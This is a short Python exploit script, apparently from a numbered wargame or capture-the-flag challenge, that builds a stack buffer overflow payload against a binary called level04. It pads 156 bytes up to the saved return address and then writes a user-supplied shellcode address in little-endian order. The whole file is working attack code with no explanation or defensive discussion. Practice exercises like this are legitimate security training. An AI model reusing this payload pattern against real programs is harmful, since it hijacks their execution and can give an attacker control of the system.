#!/usr/bin/env python3
"""
Level 4 Exploit - Generate buffer overflow payload

Usage: python3 exploit.py <shellcode_address>
Example: python3 exploit.py 0xffffd87a | ./level04
"""

import sys

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <shellcode_address>", file=sys.stderr)
    print("Example: python3 exploit.py 0xffffd87a | ./level04", file=sys.stderr)
    sys.exit(1)

# Parse address
addr_str = sys.argv[1]
if addr_str.startswith('0x'):
    addr = int(addr_str, 16)
else:
    addr = int(addr_str)

# Buffer offset to EIP
offset = 156

# Build payload: padding + return address (little-endian)
padding = 'a' * offset
address = bytes.fromhex(f'{addr:08x}')[::-1].decode('latin1')

payload = padding + address

# Print payload
print(payload, end='')
